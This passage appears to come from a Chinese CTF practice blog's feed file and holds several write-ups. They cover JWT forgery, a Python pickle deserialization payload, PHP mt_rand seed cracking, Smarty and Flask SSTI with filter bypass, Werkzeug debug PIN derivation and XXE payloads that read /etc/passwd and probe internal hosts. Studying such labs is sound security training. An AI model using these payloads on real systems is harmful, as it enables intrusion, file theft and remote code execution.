href="https://pic.imgdb.cn/item/609786a1d1a9ae528f2bd185.png"><img src="https://pic.imgdb.cn/item/609786a1d1a9ae528f2bd185.png"></a>  </p><p>发现有一个变量折扣是可以更改的，那么我们直接把它改到我们能买起。  </p><p><a href="https://pic.imgdb.cn/item/609786e9d1a9ae528f2f1c96.png"><img src="https://pic.imgdb.cn/item/609786e9d1a9ae528f2f1c96.png"></a>  </p><p>可以看到给了我们一个新的url地址，我们登录一下。  </p><p><a href="https://pic.imgdb.cn/item/6097877dd1a9ae528f3603c6.png"><img src="https://pic.imgdb.cn/item/6097877dd1a9ae528f3603c6.png"></a>  </p><p>可以看到只允许admin访问，这里就涉及到第一个知识点<strong>jwt</strong>  </p><pre><code>JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。  </code></pre><p>简单来说就是一个身份认证，它由三部分组成：header，payload，signature。  </p><h2 id="header"><a href="#header" class="headerlink" title="header"></a>header</h2><p>header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。  </p><p>例如：  </p><pre><code>&#123;      &quot;alg&quot;:&quot;hs256&quot;,      &quot;typ&quot;:&quot;JWT&quot;  &#125;  </code></pre><p>然后，用Base64对这个JSON编码就得到JWT的第一部分.  </p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。</p><pre><code>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。Public claims : 可以随意定义。Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明  </code></pre><p>例如：<br>    {<br>        “sub”:”1234567890”,<br>        “name”:”jhon doe”,<br>        “admin”:true<br>    }  </p><h2 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h2><p>为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中指定的那个，然对它们签名即可。</p><p>例如：</p><p>HMACSHA256(base64UrlEncode(header) + “.” + base64UrlEncode(payload), secret)</p><p>签名是用于验证消息在传递过程中有没有被更改，并且，对于使用私钥签名的token，它还可以验证JWT的发送方是否为它所称的发送方。  </p><p>以上就是关于JWT生成的大致的介绍，关于生成JWT可以去官网上操作，比较简单。  </p><p><a href="https://jwt.io/">JWT官网</a>  </p><p>前面抓包时我们已经可以看到，这道题关于身份的验证时通过JWT来的，接下来就是伪造admin的jwt了，我们先解码原本的jwt。  </p><p><a href="https://pic.imgdb.cn/item/60978a11d1a9ae528f54379d.png"><img src="https://pic.imgdb.cn/item/60978a11d1a9ae528f54379d.png"></a>  </p><p>可以看到用户名是我自己注册的123，我们这里要改成admin，而最后一部分是经过hs256加密过的，我们可以使用工具破解得到密钥是<strong>1Kun</strong>  </p><p>那么接下来我们就可以到官网伪造我们的JWT了。  </p><p><a href="https://pic.imgdb.cn/item/60978af0d1a9ae528f5fca34.png"><img src="https://pic.imgdb.cn/item/60978af0d1a9ae528f5fca34.png"></a>  </p><p>然后用这个JWT就可以成功登录，（这里jwt在网页的cookie里，要在网页里修改）  </p><p><a href="https://pic.imgdb.cn/item/60978bafd1a9ae528f69d3ce.png"><img src="https://pic.imgdb.cn/item/60978bafd1a9ae528f69d3ce.png"></a>  </p><p>成功登录后看到源码下载地址，下载下来发现是python代码，其中有一个地方是python的反序列化。  </p><pre><code>import tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler):@tornado.web.authenticateddef get(self, *args, **kwargs):    if self.current_user == &quot;admin&quot;:        return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)    else:        return self.render(&#39;no_ass.html&#39;)@tornado.web.authenticateddef post(self, *args, **kwargs):    try:        become = self.get_argument(&#39;become&#39;)        p = pickle.loads(urllib.unquote(become))        return self.render(&#39;form.html&#39;, res=p, member=1)    except:        return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)  </code></pre><p>原来python也能进行序列化和反序列化，而且有一个关于__ reduce <strong>()魔法函数的漏洞，**具体原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发__reduce</strong>()函数从而触发恶意代码。**  </p><p>下面会附上相关博客下，这里对于原理不细讲了。  </p><p>那么我们点击一件成为大会员后抓包，可以看到这个become参数我们是可以控制的，那么我们重写__ reduce <strong>()魔法方法然后传入become，从而触发重写</strong> reduce __()魔法方法的漏洞  </p><pre><code>import pickleimport urllibclass payload(object):def __reduce__(self):   return (eval, (&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;,))    #打开读取flag.txt的内容a = pickle.dumps(payload())  #序列化payloada = urllib.quote(a)  #进行url编码print a</code></pre><p>得到的编码是  </p><pre><code>c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.  </code></pre><p>传入become就能得到flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题有一个新的知识点，就是关于JWT和python的反序列化漏洞，这两个一个可以通过官网伪造，另一个有通用的payload，算是学到新知识了。  </p><p>附上学习链接   </p><p><a href="https://www.cnblogs.com/cjsblog/p/9277677.html">认识JWT</a><br><a href="https://blog.csdn.net/SKI_12/article/details/85015803">（Python）cPickle反序列化漏洞</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test79 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>php伪随机数</title>
+      <link href="test79/undefined-undefined.html"/>
+      <url>test79/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>今天做了一道php随机数的题目。一个新的知识点记录一下。  </p><p>打开题目，发现要我们抽奖，要填对20个字符才能得到flag，但是他给了我们一部分flag。  </p><p>靠猜和一个个试显然是不可能的，那么我们看一下有无源码，f12发现有一个/check.php网页。  </p><p><a href="https://pic.imgdb.cn/item/609b3e28d1a9ae528ff07ad2.png"><img src="https://pic.imgdb.cn/item/609b3e28d1a9ae528ff07ad2.png"></a>  </p><p>打开这个网页得到源码  </p><pre><code>qmC46RE62n&lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#39;seed&#39;]))&#123;$_SESSION[&#39;seed&#39;]=rand(0,999999999);&#125;mt_srand($_SESSION[&#39;seed&#39;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#39;&#39;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123;$str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#39;num&#39;]))&#123;if($_POST[&#39;num&#39;]===$str)&#123;x    echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;;&#125;else&#123;    echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;&#125;&#125;show_source(&quot;check.php&quot;);  </code></pre><p>可以看到显示随机生成了一个种子seed，然后用mt_srand()函数和这个种子随机生成字符串，现在给我们展现的是前生成的十个字符。  </p><p>总所周知，伪随机并非真的随机，而在mt_srand()函数中，当种子不变时，生成的随机数是一样的，那么我们就有可能通过他生成的随机数来反推出种子，有了种子我们就可以得到完整的字符串。  </p><p>这里使用php _mt _seed这个工具来反推出种子  </p><pre><code>php_mt_rand 工具只能用于爆破mt_rand()函数产生的随机数的种子值， 无论是否显式调用mt_srand()函数播种，但不能用于mt_rand(1,1000)这种指定范围的和rand函数的爆破  </code></pre><p>首先我们先用脚本将前十个我们已经知道的字符串转换成对应的随机数。（大佬的脚本，tql）  </p><pre><code>str1=&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;str2=&#39;qmC46RE62n&#39;str3 = str1[::-1]length = len(str2)res=&#39;&#39;for i in range(len(str2)):  for j in range(len(str1)):    if str2[i] == str1[j]:        res+=str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;        breakprint(res)  </code></pre><p><a href="https://pic.imgdb.cn/item/609b3fd7d1a9ae528ffd5525.png"><img src="https://pic.imgdb.cn/item/609b3fd7d1a9ae528ffd5525.png"></a></p><p>得到随机数  </p><pre><code>16 16 0 61 12 12 0 61 38 38 0 61 30 30 0 61 32 32 0 61 53 53 0 61 40 40 0 61 32 32 0 61 28 28 0 61 13 13 0 61  </code></pre><p>然后将随机数放入php _mt _seed来反推种子。  </p><p><a href="https://pic.imgdb.cn/item/609b40e5d1a9ae528f06a3aa.png"><img src="https://pic.imgdb.cn/item/609b40e5d1a9ae528f06a3aa.png"></a>  </p><p>得到种子为655093557，php版本为7.1.0+(这个版本很重要，不同的php版本的mt_srand()函数使用相同的种子得到的随机数不同)  </p><p>接下来我们只需要在源码上稍作修改，让他显示全部字符串并将我们得到的种子输入mt_srand()函数就能得到完整字符串。  </p><pre><code>&lt;?phpmt_srand(655093557);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#39;&#39;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123;$str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;echo &quot;&lt;p id=&#39;p1&#39;&gt;&quot;.$str.&quot;&lt;/p&gt;&quot;;</code></pre><p><a href="https://pic.imgdb.cn/item/609b41d9d1a9ae528f0e569d.png"><img src="https://pic.imgdb.cn/item/609b41d9d1a9ae528f0e569d.png"></a>  </p><p>得到完整字符串qmC46RE62nCuh0IzcrY2，输入就得到flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目考的就是php的伪随机数的生成函数mt_srand()以及它的一些规律，当种子不变时，生成的随机数不变。同时知道了一个专门针对这个函数的脚本工具来反推种子。题目不难，重在对新工具和知识的掌握。  </p><p>附上链接：  </p><p><a href="https://blog.csdn.net/zss192/article/details/104327432">php伪随机数</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test79 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习29</title>
+      <link href="test78/undefined-undefined.html"/>
+      <url>test78/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h1><p>打开题目，发现界面有些看不懂…..  </p><p><a href="https://img.imgdb.cn/item/6092b9afd1a9ae528f438010.png"><img src="https://img.imgdb.cn/item/6092b9afd1a9ae528f438010.png"></a>  </p><p>但是一圈看下来发现是和ip地址有关，而且在结尾又附上了一句“Build With Smarty !”，好家伙，这和ssti注入没有关系我是不相信的。结合目前网页上显示的ip地址和下面的xff，推测这道题是用xff伪造ip地址并且进行ssti注入。 </p><p>那么直接抓包开干，抓包后用X-Forwarded-For伪造ip为{7*7}。  </p><p>注意这个框架为smarty，这个框架和我们一般遇到的flask的注入方式是不一样的，详细见我之前的一篇博客，这里不再赘述。  </p><p>伪造ip后发送看一下是否存在ssti注入：  </p><p><a href="https://img.imgdb.cn/item/6092bb01d1a9ae528f54eb97.png"><img src="https://img.imgdb.cn/item/6092bb01d1a9ae528f54eb97.png"></a>  </p><p>发现现在的ip变为了49，看来确实存在ssti注入，那么接下来直接上smarty框架的命令执行的payload（前面说到这个和flask的ssti注入是不一样的）。  </p><pre><code>X-Forwarded-For: &#123;if system(&#39;ls /&#39;)&#125;&#123;/if&#125;  </code></pre><p>发现flag文件。  </p><p><a href="https://img.imgdb.cn/item/6092bbfed1a9ae528f62d93d.png"><img src="https://img.imgdb.cn/item/6092bbfed1a9ae528f62d93d.png"></a>  </p><p>直接读取  </p><pre><code>X-Forwarded-For: &#123;if system(&#39;cat /flag&#39;)&#125;&#123;/if&#125;  </code></pre><p>得到flag，很简单的一题。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题其实就是一个简单的smarty框架下的ssti注入题，之前写过类似的，关于ssti注入的不同框架下的不同做法还需要掌握。  </p><p>附上之前写的那篇关于smarty框架下的ssti注入的博客。  </p><p><a href="https://george186.github.io/test51/undefined-undefined.html">smarty的SSTI注入</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test78 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习28——关于flask框架的再进一步</title>
+      <link href="test77/undefined-undefined.html"/>
+      <url>test77/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h1><p>看到题目就应该知道这道题想考什么，关于flask框架目前我只见过ssti注入，所以这道题一开始也是往ssti上想。  </p><p>打开题目，发现是一个再flask框架下的base64加密程序。输入字符会被加密成base64码。  </p><p>我们先输入一个测试ssti注入的{ {7*7} }；  </p><p><a href="https://img.imgdb.cn/item/6092b727d1a9ae528f1fbd7d.png"><img src="https://img.imgdb.cn/item/6092b727d1a9ae528f1fbd7d.png"></a>  </p><p>得到base64编码，然后我们再将其放到解码页面解码。  </p><p><a href="https://img.imgdb.cn/item/6092b768d1a9ae528f235142.png"><img src="https://img.imgdb.cn/item/6092b768d1a9ae528f235142.png"></a>  </p><p>可以看到。应该是有些字符被过滤了，并没有成功注入，但是这也告诉我们了这道题的思路，就是将我们注入的payload编码然后再放到解码页面解码，绕过过滤后成功注入。  </p><p>那么接下来就是要找什么被过滤了，我们看一下题目中的提示。提示说“失败乃是成功之母”？？？？这个是啥意思，看了别人的wp后才知道这个是提示我们开启了debug模式，当我们输入一些不能解码的字符，就会跳转到debug界面，而flask开启debug模式是很危险的，这里简单说一下原因：  </p><p>如图所示的debug界面：  </p><p><a href="https://pic.imgdb.cn/item/6094d3ead1a9ae528f452640.png"><img src="https://pic.imgdb.cn/item/6094d3ead1a9ae528f452640.png"></a>  </p><p>可以看到，当我们开启了debug模式后，我们是可以看到报错部分的部分代码的，这就造成了源码的泄露，有些黑客就可以通过这一点来绕过一些保护，比如现在已经泄露了以下源码：  </p><pre><code>@app.route(&#39;/decode&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])def decode():if request.values.get(&#39;text&#39;) :[Open an interactive python shell in this frame]         text = request.values.get(&quot;text&quot;)    text_decode = base64.b64decode(text.encode())    tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())    if waf(tmp) :        flash(&quot;no no no !!&quot;)        return redirect(url_for(&#39;decode&#39;))    res =  render_template_string(tmp)    flash( res )  </code></pre><p>可以清楚的看到这里有一个waf保护，其中就有第一次我们测试注入的字符，而我们要做的就是绕过这个waf。  </p><p>那么waf具体是什么呢，这里我们需要查看一下，这里参考大佬的ssti注入语句并且需要进行修改（链接会放在后面，tql）  </p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>这样我们就可以查看到整个app.py的源码了：  </p><p><a href="https://pic.imgdb.cn/item/6094d89bd1a9ae528f7fb41f.png"><img src="https://pic.imgdb.cn/item/6094d89bd1a9ae528f7fb41f.png"></a>  </p><p>可以看到waf到底过滤了什么字符：  </p><pre><code> def waf(str): black_list = [flag;os；system；popen;import;eval;chr;request;subprocess;commands;socket;hex;base64;*;?;]    </code></pre><p>可以看到flag，os等字符串被过滤了，这里我们如果想要读取flag，那么我们需要用字符串拼接的方法来读取（又get到一个绕过小姿势）  </p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;&#123;% for b in c.__init__.__globals__.values() %&#125;&#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eva'+'l' in b.keys() %&#125;      &#123;&#123; b['eva'+'l']('__impor'+'t__'+'("o'+'s")'+'.pope'+'n'+'("ls /").read()') &#125;&#125;    &#123;% endif %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;查看文件目录，  &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;&#123;% for b in c.__init__.__globals__.values() %&#125;&#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eva'+'l' in b.keys() %&#125;      &#123;&#123; b['eva'+'l']('__impor'+'t__'+'("o'+'s")'+'.pope'+'n'+'("cat /this_is_the_fla'+'g.txt").read()') &#125;&#125;    &#123;% endif %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;  查看flag。  </code></pre><p>但是上面说的方法其实并不是预期解，这道题的真正解法其实是利用pin码进行rec。  </p><h2 id="利用pin码进行RCE"><a href="#利用pin码进行RCE" class="headerlink" title="利用pin码进行RCE"></a>利用pin码进行RCE</h2><p>关于pin码（即个人识别码）的具体介绍我就不多说了，我们可以简单理解为一个密码，这个密码是干什么用的呢？这就要联系到前面我们讲过的debug模式了。  </p><p>我们已经知道，开启debug模式会泄露部分源码，更严重的安全问题是<strong>debug页面中包含Python的交互式shell，可以执行任意Python代码</strong>  </p><p>而旧版的flask是不需要输入pin码就可以执行代码的，其危害不言而喻，而在新的flask版本中，需要输入pin码才能执行自定义的代码，所以我们可以把pin码理解为进入交互shell的密码。  </p><p>关于pin码的生成机制我就不说了，这一块感觉不是我现在能搞明白的，下面会附上文章，我们要知道，如果要想得到pin码，那么我们需要获取如下信息：  </p><pre><code>1、服务器运行flask所登录的用户名。通过/etc/passwd中可以猜测为flaskweb 或者root，此处用的flaskweb2、modname。一般不变就是flask.app3、getattr(app, “__name__”, app.__class__.__name__)。python该值一般为Flask，该值一般不变4、flask库下app.py的绝对路径。报错信息会泄露该值。题中为/usr/local/lib/python3.7/site-packages/flask/app.py（这里又是debug模式带来的安全问题）5、当前网络的mac地址的十进制数。通过文件/sys/class/net/eth0/address 获取(eth0为网卡名)6、机器的id：对于非docker机每一个机器都会有自已唯一的idLinux：/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件Windows系统：docker：/proc/self/cgroup</code></pre><p>首先获取mac地址：  </p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;  </code></pre><p>得到mac地址02:42:ac:10:a9:51</p><p><a href="https://pic.imgdb.cn/item/6094eec5d1a9ae528f798533.png"><img src="https://pic.imgdb.cn/item/6094eec5d1a9ae528f798533.png"></a>  </p><p>然后将mac地址转化成十进制数为2485377870161。  </p><p>接下来是获取机器id：  </p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/proc/self/cgroup','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;  </code></pre><p>得到id为：6f2214d51457a0a7a59e597564a2b066a05375f51c5dbe1742b5d5dea9e929da</p><p><a href="https://pic.imgdb.cn/item/6094eff2d1a9ae528f8592f1.png"><img src="https://pic.imgdb.cn/item/6094eff2d1a9ae528f8592f1.png"></a></p><p>接下来用大佬的脚本来生成pin码（再次直呼tql）  </p><pre><code>import hashlibfrom itertools import chainprobably_public_bits = [&#39;flaskweb&#39;,#服务器运行flask所登录的用户名&#39;flask.app&#39;,#modname&#39;Flask&#39;,#getattr(app, &quot;\_\_name__&quot;, app.\_\_class__.\_\_name__)&#39;/usr/local/lib/python3.7/site-packages/flask/app.py&#39;,#flask库下app.py的绝对路径]private_bits = [&#39;2485377870161&#39;,#当前网络的mac地址的十进制数&#39;6f2214d51457a0a7a59e597564a2b066a05375f51c5dbe1742b5d5dea9e929da&#39;#机器的id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits):if not bit:    continueif isinstance(bit, str):    bit = bit.encode(&#39;utf-8&#39;)h.update(bit)h.update(b&#39;cookiesalt&#39;)cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20]num = Noneif num is None:h.update(b&#39;pinsalt&#39;)num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None:for group_size in 5, 4, 3:    if len(num) % group_size == 0:        rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)                      for x in range(0, len(num), group_size))        breakelse:    rv = numprint(rv)</code></pre><p>这样就能得到pin码，pin码为：222-246-872。  </p><p><a href="https://pic.imgdb.cn/item/6094f146d1a9ae528f927279.png"><img src="https://pic.imgdb.cn/item/6094f146d1a9ae528f927279.png"></a>  </p><p>那么我们再次来到debug界面，点击右侧的命令符，输入pin码后就可以执行自定义的python代码了。  </p><pre><code>import osos.popen(&quot;ls -l /&quot;).read()#查看文件目录os.popen(&quot;cat /this_is_the_flag.txt&quot;).read()#读取flag文件  </code></pre><p><a href="https://pic.imgdb.cn/item/6094f2bfd1a9ae528f9ffcbc.png"><img src="https://pic.imgdb.cn/item/6094f2bfd1a9ae528f9ffcbc.png"></a>  </p><p>得到flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目让我对于flask这个框架有了进一步的认识，关于其debug模式开启后造成的安全隐患和ssti注入的新的办法，最重要的是pin码这一新知识点，关于pin码有了一个大概的了解，对于pin码的生成和使用有了了解。   </p><p>下面附上相关博客和文章。  </p><p><a href="https://zhuanlan.zhihu.com/p/32138231">Flask开启debug模式等于给黑客留了后门</a><br><a href="https://www.cnblogs.com/HacTF/p/8160076.html">Flask debug 模式 PIN 码生成机制安全性研究笔记</a><br><a href="https://www.secpulse.com/archives/140019.html">关于Flask SSTI，解锁你不知道的新姿势</a><br><a href="https://blog.csdn.net/xmousez/article/details/57097754?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162037459616780269875419%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162037459616780269875419&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-57097754.first_rank_v2_pc_rank_v29&utm_term=pin%E7%A0%81">个人对PIN码的基本理解</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test77 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习27——XML注入之探测内网</title>
+      <link href="test76/undefined-undefined.html"/>
+      <url>test76/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>这道题目是还是xml外部实体注入，只不过扩展了xml注入的攻击手段。这次的xml注入是关于内网探测的攻击。  </p><h1 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h1><p>打开题目，是一个登录界面，题目已经提示是xml了，那么直接抓包看看。  </p><p><a href="https://img.imgdb.cn/item/608cd4cad1a9ae528f5a204a.png"><img src="https://img.imgdb.cn/item/608cd4cad1a9ae528f5a204a.png"></a>  </p><p>确实是xml的代码格式。可以直接把上一道题目的payload打上去试试。  </p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE user [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;    </code></pre><p>发现确实可用，但是不能直接用file://协议读取flag。  </p><p><a href="https://img.imgdb.cn/item/608cd584d1a9ae528f608cbf.png"><img src="https://img.imgdb.cn/item/608cd584d1a9ae528f608cbf.png"></a>  </p><p>那么我们先读取一下它的源码</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE user [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./doLogin.php&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;    </code></pre><p>确实能读到，但是解码后发现没什么用处。  </p><pre><code>&lt;?php/*** autor: c0ny1* date: 2018-2-7*/$USERNAME = &#39;admin&#39;; //账号$PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //密码$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#39;php://input&#39;);try&#123;$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);$username = $creds-&gt;username;$password = $creds-&gt;password;if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);&#125;else&#123;    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);&#125;    &#125;catch(Exception $e)&#123;$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#39;Content-Type: text/html; charset=utf-8&#39;);echo $result;?&gt;</code></pre><p>所以这道题考察的不是xml注入file://协议读取文件了，而是内网探测。  </p><p>我们可以通过xml注入来探测主机ip地址，如下所示：  </p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE user [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;</code></pre><p>这里的etc/hosts也是一个很重要的文件，它包含了主机名和ip配置文件。  </p><p><a href="https://img.imgdb.cn/item/608cd73dd1a9ae528f6fee31.png"><img src="https://img.imgdb.cn/item/608cd73dd1a9ae528f6fee31.png"></a>  </p><p>可以看到主机ip，但是看不到目标主机的ip，这里我们可以读取另一个和ip相关的文件——/proc/net/arp。   </p><pre><code>详细介绍:/proc/net/arpIP address HW type Flags HW address Mask Device    192.168.1.151 0x1 0x2 00:e0:4c:19:1a:98 * eth0    192.168.1.1 0x1 0x2 00:14:78:e7:c4:e8 * eth0每个网络接口的arp表中dev包的统计IP address：IP地址（直连）HW type：硬件类型23=0x17 strip (Metricom Starmode IP)01=0x01 ether (Ethernet)15=0xf dlci (Frame Relay DLCI)Flags：HW address：MAC 地址Mask：Device：所在网络接口</code></pre><p>这两个文件都是和主机地址相关的重要文件，我们读取这个文件可以看到目标主机ip地址。   </p><p><a href="https://img.imgdb.cn/item/608cd874d1a9ae528f7a996f.png"><img src="https://img.imgdb.cn/item/608cd874d1a9ae528f7a996f.png"></a>  </p><p>ip地址为10.0.228.2，我们读取一下这个ip：  </p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE user [ &lt;!ENTITY xxe SYSTEM &quot;http://10.0.228.2&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;  </code></pre><p><a href="https://img.imgdb.cn/item/608cd905d1a9ae528f7f67d2.png"><img src="https://img.imgdb.cn/item/608cd905d1a9ae528f7f67d2.png"></a>  </p><p>发现这个ip读取不了，我们可以一个个的试ip地址，最后发现当ip最后一位为11时，能够成功读取，从而获得flag。  </p><p><a href="https://img.imgdb.cn/item/608cda63d1a9ae528f8b9db1.png"><img src="https://img.imgdb.cn/item/608cda63d1a9ae528f8b9db1.png"></a>  </p><p>我们也可以用爆破来得到存活的ip地址：   </p><p><a href="https://img.imgdb.cn/item/608cdb3ad1a9ae528f93cb33.png"><img src="https://img.imgdb.cn/item/608cdb3ad1a9ae528f93cb33.png"></a>  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实关于xml外部实体注入还有很多攻击方法，或者说是用法，现在已经学到了读取文件和探测主机，下面会附上其他用法，以后遇到要多做积累。  </p><p><a 